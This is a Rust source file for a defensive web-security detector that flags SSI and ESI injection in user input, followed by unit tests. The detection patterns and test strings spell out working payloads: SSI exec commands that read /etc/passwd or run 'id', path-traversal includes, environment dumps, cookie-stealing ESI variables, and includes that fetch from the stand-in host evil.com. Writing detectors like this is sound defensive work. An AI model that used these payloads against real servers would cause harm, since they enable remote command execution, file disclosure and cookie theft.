//! Server-Side Includes (SSI) Injection Evaluator — Level 2
//!
//! Detects SSI directive injection in user input. When a web server has
//! SSI processing enabled (.shtml, etc.), injected directives execute
//! server-side commands or include files.
//!
//! Impact: RCE via `<!--#exec cmd="..."-->`, file disclosure via
//! `<!--#include virtual="..."-->`.

use crate::evaluators::{EvidenceOperation, L2Detection, L2Evaluator, ProofEvidence};
use crate::types::InvariantClass;

type RustDetection = L2Detection;

pub struct SsiEvaluator;

fn detect_ssi_remote_include(input: &str) -> Option<RustDetection> {
    let lower = input.to_ascii_lowercase();

    if let Some(pos) = lower.find("<!--#include") {
        let window_end = lower.len().min(pos + 220);
        let slice = &lower[pos..window_end];
        let has_remote = (slice.contains("virtual='http://")
            || slice.contains("virtual=\"http://")
            || slice.contains("virtual='https://")
            || slice.contains("virtual=\"https://"))
            || (slice.contains("virtual='//") || slice.contains("virtual=\"//"));
        let has_traversal_file = (slice.contains("file='") || slice.contains("file=\""))
            && (slice.contains("../") || slice.contains("..\\"));
        if has_remote || has_traversal_file {
            return Some(RustDetection {
                detection_type: "ssi_remote_include".into(),
                confidence: 0.95,
                detail: "SSI include directive references remote URL or traversal file path".into(),
                position: pos,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: input[pos..input.len().min(pos + 100)].to_string(),
                    interpretation: "SSI include with attacker-controlled remote URL or traversal path can disclose files and execute server-side include fetch behavior.".into(),
                    offset: pos,
                    property: "SSI include directives must not accept untrusted input for virtual/file targets.".into(),
                }],
            });
        }
    }

    None
}

fn detect_ssi_exec_cmd(input: &str) -> Option<RustDetection> {
    let lower = input.to_ascii_lowercase();
    if let Some(pos) = lower.find("<!--#exec") {
        let window_end = lower.len().min(pos + 180);
        let slice = &lower[pos..window_end];
        if slice.contains("cmd='")
            || slice.contains("cmd=\"")
            || slice.contains("cgi='")
            || slice.contains("cgi=\"")
        {
            return Some(RustDetection {
                detection_type: "ssi_exec_cmd".into(),
                confidence: 0.96,
                detail: "SSI exec directive invokes cmd/cfg server-side execution".into(),
                position: pos,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: input[pos..input.len().min(pos + 100)].to_string(),
                    interpretation: "SSI exec directive executes OS commands or CGI handlers when SSI is enabled.".into(),
                    offset: pos,
                    property: "Untrusted input must not contain SSI exec cmd/cfg directives.".into(),
                }],
            });
        }
    }
    None
}

fn detect_ssi_env_disclosure(input: &str) -> Option<RustDetection> {
    let lower = input.to_ascii_lowercase();
    if let Some(pos) = lower.find("<!--#echo") {
        let window_end = lower.len().min(pos + 180);
        let slice = &lower[pos..window_end];
        if slice.contains("var='") || slice.contains("var=\"") {
            return Some(RustDetection {
                detection_type: "ssi_env_disclosure".into(),
                confidence: 0.88,
                detail: "SSI echo variable disclosure pattern".into(),
                position: pos,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: input[pos..input.len().min(pos + 100)].to_string(),
                    interpretation: "SSI echo var directive can leak server environment variables such as DOCUMENT_ROOT.".into(),
                    offset: pos,
                    property: "SSI variable echo directives must not be user-controllable.".into(),
                }],
            });
        }
    }

    if let Some(pos) = lower.find("<!--#printenv") {
        return Some(RustDetection {
            detection_type: "ssi_env_disclosure".into(),
            confidence: 0.88,
            detail: "SSI printenv environment dump pattern".into(),
            position: pos,
            evidence: vec![ProofEvidence {
                operation: EvidenceOperation::PayloadInject,
                matched_input: input[pos..input.len().min(pos + 100)].to_string(),
                interpretation: "SSI printenv dumps environment variables and may expose sensitive server configuration.".into(),
                offset: pos,
                property: "SSI printenv directives must be blocked from untrusted input.".into(),
            }],
        });
    }

    None
}

fn detect_ssi_obfuscated(input: &str) -> Option<RustDetection> {
    let lower = input.to_ascii_lowercase();
    let encoded_pos = lower
        .find("%3c%21--")
        .or_else(|| lower.find("%3c!--"))
        .or_else(|| lower.find("%3c%21%2d%2d"))
        .or_else(|| lower.find("<!--%23"));
    if let Some(pos) = encoded_pos {
        return Some(RustDetection {
            detection_type: "ssi_obfuscated".into(),
            confidence: 0.87,
            detail: "Obfuscated SSI directive marker (encoded comment/directive start)".into(),
            position: pos,
            evidence: vec![ProofEvidence {
                operation: EvidenceOperation::ContextEscape,
                matched_input: input[pos..input.len().min(pos + 80)].to_string(),
                interpretation: "Encoded SSI delimiters can bypass naive filters and be decoded server-side into executable directives.".into(),
                offset: pos,
                property: "Input must be normalized before SSI filtering, including URL-decoding.".into(),
            }],
        });
    }

    if let Some(pos) = lower.find('\0') {
        if lower.contains("<!--#") || lower.contains("<!-- #") || lower.contains("%23") {
            return Some(RustDetection {
                detection_type: "ssi_obfuscated".into(),
                confidence: 0.87,
                detail: "SSI directive with null-byte obfuscation".into(),
                position: pos,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::ContextEscape,
                    matched_input: input[pos..input.len().min(pos + 80)].to_string(),
                    interpretation: "Null-byte injection can alter parser behavior and evade directive pattern matching.".into(),
                    offset: pos,
                    property: "Null bytes should be stripped before SSI directive validation.".into(),
                }],
            });
        }
    }

    if let Some(pos) = lower.find("<!-- #include") {
        return Some(RustDetection {
            detection_type: "ssi_obfuscated".into(),
            confidence: 0.87,
            detail: "Whitespace-padded SSI directive marker".into(),
            position: pos,
            evidence: vec![ProofEvidence {
                operation: EvidenceOperation::ContextEscape,
                matched_input: input[pos..input.len().min(pos + 80)].to_string(),
                interpretation: "Whitespace padding inside SSI directive markers can evade strict signature matching.".into(),
                offset: pos,
                property: "SSI matching should allow normalized whitespace and reject directive variants.".into(),
            }],
        });
    }

    None
}

fn detect_ssi_time_disclosure(input: &str) -> Option<f32> {
    let lower = input.to_ascii_lowercase();
    let has_date_local = lower.contains("<!--#echo var='date_local'")
        || lower.contains("<!--#echo var=\"date_local\"");
    let has_last_modified = lower.contains("<!--#echo var='last_modified'")
        || lower.contains("<!--#echo var=\"last_modified\"");
    if has_date_local || has_last_modified {
        Some(0.86)
    } else {
        None
    }
}

fn detect_ssi_printenv_disclosure(input: &str) -> Option<f32> {
    let lower = input.to_ascii_lowercase();
    if lower.contains("<!--#printenv") {
        Some(0.90)
    } else {
        None
    }
}

impl L2Evaluator for SsiEvaluator {
    fn id(&self) -> &'static str {
        "ssi"
    }
    fn prefix(&self) -> &'static str {
        "L2 SSI"
    }

    fn detect(&self, input: &str) -> Vec<L2Detection> {
        let mut dets = Vec::new();
        let decoded = crate::encoding::multi_layer_decode(input).fully_decoded;
        let lower = decoded.to_ascii_lowercase();

        // SSI directives: <!--#directive param="value" -->
        let ssi_directives = [
            ("<!--#exec", "exec", "Server-side command execution via SSI exec directive", 0.95),
            ("<!--#include", "include", "Server-side file inclusion via SSI include directive", 0.92),
            ("<!--#echo", "echo", "SSI echo directive — environment variable disclosure", 0.80),
            ("<!--#set", "set", "SSI set directive — variable manipulation", 0.78),
            ("<!--#config", "config", "SSI config directive — error message manipulation", 0.75),
            ("<!--#flastmod", "flastmod", "SSI flastmod directive — file metadata disclosure", 0.72),
            ("<!--#fsize", "fsize", "SSI fsize directive — file size disclosure", 0.72),
            ("<!--#printenv", "printenv", "SSI printenv directive — full environment dump", 0.90),
        ];

        for &(pattern, name, desc, confidence) in &ssi_directives {
            if lower.contains(pattern) {
                let pos = lower.find(pattern).unwrap_or(0);
                dets.push(L2Detection {
                    detection_type: format!("ssi_{}", name),
                    confidence,
                    detail: desc.into(),
                    position: pos,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: decoded[pos..decoded.len().min(pos + 60)].to_string(),
                        interpretation: format!(
                            "Input contains SSI directive '<!--#{}'. When processed by a server with SSI enabled (Apache mod_include, Nginx ssi on), this directive executes server-side. The '{}' directive {}.",
                            name, name,
                            match name {
                                "exec" => "executes arbitrary OS commands",
                                "include" => "reads arbitrary files from the server filesystem",
                                "echo" => "discloses server environment variables",
                                "printenv" => "dumps all server environment variables",
                                _ => "manipulates server-side processing"
                            }
                        ),
                        offset: pos,
                        property: format!("User input must not contain SSI directives. The <!--#{} syntax must be escaped or rejected.", name),
                    }],
                });
            }
        }

        // ESI directives: <esi:* ...> and ESI variable expansions $(HTTP_*{...})
        if lower.contains("<esi:include") {
            let pattern = "<esi:include";
            let pos = lower.find(pattern).unwrap_or(0);
            dets.push(L2Detection {
                detection_type: "ssi_esi_include".into(),
                confidence: 0.91,
                detail: "ESI include directive can trigger SSRF through CDN/reverse-proxy fetch".into(),
                position: pos,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[pos..decoded.len().min(pos + 60)].to_string(),
                    interpretation: "Input contains '<esi:include'. ESI processors (Varnish, Squid, Akamai, Cloudflare) may fetch attacker-controlled URLs server-side, enabling SSRF and internal network probing.".into(),
                    offset: pos,
                    property: "User input must not contain ESI include directives or untrusted ESI markup.".into(),
                }],
            });
        }

        if lower.contains("<esi:vars") || lower.contains("$(http_cookie{") || lower.contains("$(http_header{") {
            let pos = lower
                .find("<esi:vars")
                .or_else(|| lower.find("$(http_cookie{"))
                .or_else(|| lower.find("$(http_header{"))
                .unwrap_or(0);
            dets.push(L2Detection {
                detection_type: "ssi_esi_vars".into(),
                confidence: 0.85,
                detail: "ESI variable expansion can disclose cookies and headers from edge context".into(),
                position: pos,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[pos..decoded.len().min(pos + 60)].to_string(),
                    interpretation: "Input contains ESI variable syntax (<esi:vars> or $(HTTP_COOKIE{...})/$(HTTP_HEADER{...})). This can exfiltrate sensitive header and cookie data via edge-side rendering.".into(),
                    offset: pos,
                    property: "User input must not contain ESI variable directives or HTTP_* variable expansions.".into(),
                }],
            });
        }

        if (lower.contains("<esi:remove>")
            && (lower.contains("<script")
                || lower.contains("javascript:")
                || lower.contains("onerror=")
                || lower.contains("onload=")))
            || lower.contains("<esi:comment")
        {
            let pos = lower
                .find("<esi:remove>")
                .or_else(|| lower.find("<esi:comment"))
                .unwrap_or(0);
            dets.push(L2Detection {
                detection_type: "ssi_esi_remove".into(),
                confidence: 0.82,
                detail: "ESI remove/comment directives can be abused to bypass filters and enable XSS payload shaping".into(),
                position: pos,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[pos..decoded.len().min(pos + 60)].to_string(),
                    interpretation: "Input contains ESI remove/comment markup. Attackers can hide or reshape script content at the edge to bypass WAF/view-layer defenses.".into(),
                    offset: pos,
                    property: "User input must not contain ESI remove/comment directives or script-bearing ESI fragments.".into(),
                }],
            });
        }

        if lower.contains("<esi:choose") || lower.contains("<esi:when") || lower.contains("<esi:otherwise") {
            let pos = lower
                .find("<esi:choose")
                .or_else(|| lower.find("<esi:when"))
                .or_else(|| lower.find("<esi:otherwise"))
                .unwrap_or(0);
            dets.push(L2Detection {
                detection_type: "ssi_esi_conditional".into(),
                confidence: 0.86,
                detail: "ESI conditional directives enable attacker-controlled conditional content injection".into(),
                position: pos,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[pos..decoded.len().min(pos + 60)].to_string(),
                    interpretation: "Input contains ESI conditional directives (<esi:choose>/<esi:when>/<esi:otherwise>). These can inject logic-driven payloads rendered by CDN/reverse-proxy ESI processors.".into(),
                    offset: pos,
                    property: "User input must not contain ESI conditional directives.".into(),
                }],
            });
        }

        if let Some(det) = detect_ssi_remote_include(&decoded) {
            dets.push(det);
        }
        if let Some(det) = detect_ssi_exec_cmd(&decoded) {
            dets.push(det);
        }
        if let Some(det) = detect_ssi_env_disclosure(&decoded) {
            dets.push(det);
        }
        if let Some(det) = detect_ssi_obfuscated(input).or_else(|| detect_ssi_obfuscated(&decoded)) {
            dets.push(det);
        }
        if let Some(confidence) = detect_ssi_time_disclosure(&decoded) {
            let position = lower
                .find("<!--#echo var='date_local'")
                .or_else(|| lower.find("<!--#echo var=\"date_local\""))
                .or_else(|| lower.find("<!--#echo var='last_modified'"))
                .or_else(|| lower.find("<!--#echo var=\"last_modified\""))
                .unwrap_or(0);
            dets.push(L2Detection {
                detection_type: "ssi_time_disclosure".into(),
                confidence: confidence.into(),
                detail: "SSI echo directive leaks server time metadata (DATE_LOCAL/LAST_MODIFIED)"
                    .into(),
                position,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[position..decoded.len().min(position + 100)].to_string(),
                    interpretation: "SSI DATE_LOCAL/LAST_MODIFIED variables disclose server-side time and file metadata useful for fingerprinting or cache/proxy timing attacks.".into(),
                    offset: position,
                    property: "Untrusted input must not control SSI echo directives for server metadata variables.".into(),
                }],
            });
        }
        if let Some(confidence) = detect_ssi_printenv_disclosure(&decoded) {
            let position = lower.find("<!--#printenv").unwrap_or(0);
            dets.push(L2Detection {
                detection_type: "ssi_printenv_disclosure".into(),
                confidence: confidence.into(),
                detail: "SSI printenv directive leaks process environment variables".into(),
                position,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[position..decoded.len().min(position + 100)].to_string(),
                    interpretation: "SSI printenv exposes environment variables that can include secrets, keys, service endpoints, and deployment metadata.".into(),
                    offset: position,
                    property: "SSI printenv directives must be blocked from untrusted input and templates.".into(),
                }],
            });
        }

        dets
    }

    fn map_class(&self, detection_type: &str) -> Option<InvariantClass> {
        if detection_type.starts_with("ssi_") {
            Some(InvariantClass::SsiInjection)
        } else {
            None
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_ssi_exec() {
        let eval = SsiEvaluator;
        let dets = eval.detect(r#"<!--#exec cmd="cat /etc/passwd" -->"#);
        assert!(dets.iter().any(|d| d.detection_type == "ssi_exec"));
    }

    #[test]
    fn detects_ssi_include() {
        let eval = SsiEvaluator;
        let dets = eval.detect(r#"<!--#include virtual="/etc/passwd" -->"#);
        assert!(dets.iter().any(|d| d.detection_type == "ssi_include"));
    }

    #[test]
    fn detects_ssi_printenv() {
        let eval = SsiEvaluator;
        let dets = eval.detect("<!--#printenv -->");
        assert!(dets.iter().any(|d| d.detection_type == "ssi_printenv"));
    }

    #[test]
    fn no_detection_for_html_comment() {
        let eval = SsiEvaluator;
        let dets = eval.detect("<!-- this is a regular comment -->");
        assert!(dets.is_empty());
    }

    #[test]
    fn maps_to_correct_class() {
        let eval = SsiEvaluator;
        assert_eq!(
            eval.map_class("ssi_exec"),
            Some(InvariantClass::SsiInjection)
        );
    }

    #[test]
    fn test_esi_include_ssrf() {
        let eval = SsiEvaluator;
        let dets = eval.detect(r#"<esi:include src="http://evil.com/secret" />"#);
        assert!(dets.iter().any(|d| d.detection_type == "ssi_esi_include"));
    }

    #[test]
    fn test_esi_vars_cookie_theft() {
        let eval = SsiEvaluator;
        let dets = eval.detect("$(HTTP_COOKIE{session})");
        assert!(dets.iter().any(|d| d.detection_type == "ssi_esi_vars"));
    }

    #[test]
    fn test_esi_conditional_injection() {
        let eval = SsiEvaluator;
        let dets = eval.detect(r#"<esi:choose><esi:when test="$(HTTP_COOKIE{admin})==1">"#);
        assert!(dets.iter().any(|d| d.detection_type == "ssi_esi_conditional"));
    }

    #[test]
    fn detects_ssi_remote_http_include() {
        let eval = SsiEvaluator;
        let dets = eval.detect("<!--#include virtual='http://evil.com/shell.shtml'-->");
        assert!(dets.iter().any(|d| d.detection_type == "ssi_remote_include"));
    }

    #[test]
    fn detects_ssi_file_traversal_include() {
        let eval = SsiEvaluator;
        let dets = eval.detect("<!--#include file='../../../../etc/passwd'-->");
        assert!(dets.iter().any(|d| d.detection_type == "ssi_remote_include"));
    }

    #[test]
    fn detects_ssi_exec_cmd_variant() {
        let eval = SsiEvaluator;
        let dets = eval.detect("<!--#exec cmd='id'-->");
        assert!(dets.iter().any(|d| d.detection_type == "ssi_exec_cmd"));
    }

    #[test]
    fn detects_ssi_exec_cgi_variant() {
        let eval = SsiEvaluator;
        let dets = eval.detect("<!--#exec cgi='/cgi-bin/attacker.cgi'-->");
        assert!(dets.iter().any(|d| d.detection_type == "ssi_exec_cmd"));
    }

    #[test]
    fn detects_ssi_echo_env_disclosure() {
        let eval = SsiEvaluator;
        let dets = eval.detect("<!--#echo var='DOCUMENT_ROOT'-->");
        assert!(dets.iter().any(|d| d.detection_type == "ssi_env_disclosure"));
    }

    #[test]
    fn detects_ssi_printenv_disclosure() {
        let eval = SsiEvaluator;
        let dets = eval.detect("<!--#printenv-->");
        assert!(dets.iter().any(|d| d.detection_type == "ssi_env_disclosure"));
    }

    #[test]
    fn detects_ssi_encoded_obfuscation() {
        let eval = SsiEvaluator;
        let dets = eval.detect("%3C%21--%23include virtual='http://evil.com'");
        assert!(dets.iter().any(|d| d.detection_type == "ssi_obfuscated"));
    }

    #[test]
    fn detects_ssi_whitespace_obfuscation() {
        let eval = SsiEvaluator;
        let dets = eval.detect("<!-- #include virtual='/etc/passwd' -->");
        assert!(dets.iter().any(|d| d.detection_type == "ssi_obfuscated"));
    }

    #[test]
    fn detects_ssi_time_disclosure_date_local_or_last_modified() {
        let eval = SsiEvaluator;
        let dets = eval.detect("<!--#echo var='DATE_LOCAL'--> <!--#echo var='LAST_MODIFIED'-->");
        assert!(dets
            .iter()
            .any(|d| d.detection_type == "ssi_time_disclosure"));
    }

    #[test]
    fn detects_ssi_printenv_disclosure_specific_detector() {
        let eval = SsiEvaluator;
        let dets = eval.detect("<!--#printenv-->");
        assert!(dets
            .iter()
            .any(|d| d.detection_type == "ssi_printenv_disclosure"));
    }
}
